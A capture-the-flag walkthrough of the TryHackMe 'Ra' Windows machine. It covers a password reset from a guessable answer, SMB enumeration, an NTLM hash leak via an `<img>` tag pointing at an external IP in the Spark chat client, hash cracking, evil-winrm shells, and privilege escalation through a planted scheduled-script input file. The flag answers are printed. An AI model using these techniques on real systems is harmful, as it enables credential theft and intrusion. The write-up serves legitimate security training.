### Introduction

[Ra] is a hard CTF on TryHackMe we have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable. We have spotted a new Windows machine that may lead us to our end goal.

Let's start scanning the machine with nmap.
Like we can see in the scan, it returns, a lot of ports open.



```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![scan](/images/THM/ra/2.PNG)

If we go to the website we can see a company portal.

There is something that capture our attention and is a **reset password** button.

![web](/images/THM/ra/Captura2.PNG)

If we click it, We can see the redirection didn't work.

![reset](/images/THM/ra/Captura3.PNG)

To make this working, We need to put in our /etc/hosts the IP and the domain.

```sh
nano /etc/hosts
```

![hosts](/images/THM/ra/Captura4.PNG)

Once is done, We're able to see the reset password panel.

It is conformed with a **username** and an **answer question**.
We need to find it.

![reset pass](/images/THM/ra/Captura5.PNG)

If we look around the page, we can see a section with the different supports and their mails.

Another thing that is important to note is that the only user online is buse.

![staff](/images/THM/ra/Captura6.PNG)

![staff dic](/images/THM/ra/Captura7.PNG)

If we look around a little more we find an image and the name of the image is surprisingly interesting.

The name is **lilyleAndSparky** and If this is correct we can use it to change **lilyle** password.

![image lilyle](/images/THM/ra/Captura8.PNG)

Let's try it!

![lilyle reset](/images/THM/ra/Captura9.PNG)

This has worked, so now we have user credentials.

![lilyle pass](/images/THM/ra/Captura10.PNG)

Time to use our new credentials to inspect the samba directories and what permissions we have.

```sh
smbmap -u lilyle -p 'ChangeMe#1234' -d . -H <IP>
```

We can see there are 5 directories we have **READ ONLY** permissions.

![smb -d](/images/THM/ra/Captura11.PNG)

Let's show it recursively to look around better and find if there is something interesting.

```sh
smbmap -u lilyle -p 'ChangeMe#1234' -H <IP> -r
```

![smb tree](/images/THM/ra/Captura12.PNG)

Looking around, We can find the first flag inner the **Shared** directory.

![smb tree2](/images/THM/ra/Captura13.PNG)

![smb tree3](/images/THM/ra/Captura14.PNG)

Once finished looking around, It's time to download the flag.

```sh
smbmap -u lilyle -p 'ChangeMe#1234' -H <IP> --download 'Shared\Flag 1.txt'
```

![flag download](/images/THM/ra/Captura15.PNG)

We got the first one flag!

```sh
cat <file with the flag 1>
```

![flag 1](/images/THM/ra/Captura16.PNG)

- Flag 1
>Answer: THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}

If we look, there are some interesting packages that are **spark** download packages.

```sh
smbmap -u lilyle -p 'ChangeMe#1234' -H <IP> -r 'Shared'
```

![smb shared](/images/THM/ra/Captura17.PNG)

Time to research a little to inspect this software. It seems like there are CVEs and exploits from this software. What we will do is take advantage of this.

![spark search](/images/THM/ra/Captura18.PNG)

We found a [CVE] that with When we opened a chat with another user, we could send an `<img` tag to that user with an external URL as the source of that image, like this:

`<img src=[external_ip]/test.img>`

Each time the user clicks the link, or the ROAR module automatically preloads it, the external server receives the request for the image, together with the NTLM hashes from the user that visits the link, i.e. the user you are chatting with!

![CVE](/images/THM/ra/Captura19.PNG)

So let's download it and install it in our system.

```sh
smbmap -u lilyle -p 'ChangeMe#1234' -H <IP> --download 'Shared\spark_2.8.3.deb'
```

![spark download](/images/THM/ra/Captura20.PNG)

![spark login](/images/THM/ra/Captura21.PNG)

![spark preference](/images/THM/ra/Captura22.PNG)

We are in!

Now it's time to send our exploit to our victim, like we saw in the webpage, the only user online is buse, so we're going to send it to it.

![spark live](/images/THM/ra/Captura23.PNG)

With the **responder** active and listening in, the correctly on the
interface once we send the message correctly, we got the buse password hash.

```sh
responder -I <interface>
```

![responder hash](/images/THM/ra/Captura24.PNG)

Time to crack it with **john**!

```sh
john <file with hash> --wordlist=/usr/share/wordlist/rockyou.txt
```

![buse hash crack](/images/THM/ra/Captura25.PNG)

Once is cracked, let's open up a shell with [evil-winrm]. If you want to know more about it, you can go to his GitHub repository page.

```sh
evil-winrm -i <IP> -u buse -p '<password>'
```


![evil-winrm buse](/images/THM/ra/Captura26.PNG)

When we are in, and We look around a little, We will see the second flag.

```sh
cd ..
dir
dir Desktop
cd Desktop
type 'Flag 2.txt'
```

![flag 2](/images/THM/ra/Captura27.PNG)

- Flag 2
>Answer: THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}

Let's see what we can do with buse, what type of permissions we got.

```sh
whoami /all
```

Like we can see, We are in the group **Account Operators** these means that we can manage other accounts but not admin accounts.

![whoami](/images/THM/ra/Captura28.PNG)

If we look around a little more, we can find a directory called **scripts**. Inner it we found two files, one is a **log** file and the other is a script that seems is executed every minute.

```sh
dir
cd scripts
dir
```

![scripts](/images/THM/ra/Captura29.PNG)

If we execute it in the debug we can see that we don't have perms for access to a file required called **hosts** which is found inner brittanycr directory.

We will use this file to make our escalation.

```sh
./checkservers.ps1
```

![script exec](/images/THM/ra/Captura31.PNG)

We will take the advantage that we can manage other accounts to change brittanycr password.

```sh
net user brittanycr <password>
```

![britannycr change creds](/images/THM/ra/Captura32.PNG)

Time to create our **hosts** file with the commands for creating a user and put it in the admins group.

```sh
cat hosts.txt
```

![new hosts](/images/THM/ra/Captura33.PNG)

Once is done, We need to replace the hosts in brittanycr directory with our new hosts file.

```sh
smbclient -U brittanycr //<IP>/Users
cd brittanycr
put hosts.txt
```

![change hosts](/images/THM/ra/Captura34.PNG)

We will wait a bit, allowing time for the script to run, and then we will open a shell with evil-winrm with the user we've created.

```sh
evil-winrm -i <IP> -u <user> -p '<password>'
```

![evil-winrm apofis](/images/THM/ra/Captura35.PNG)

If all that works, we got a user with admin credentials, and we can go to the **Administrators** directory and see the last one flag.

```sh
cd ..\..\Administrator\Desktop
dir
type Flag3.txt
```

![flag 3](/images/THM/ra/Captura36.PNG)

- Flag 3
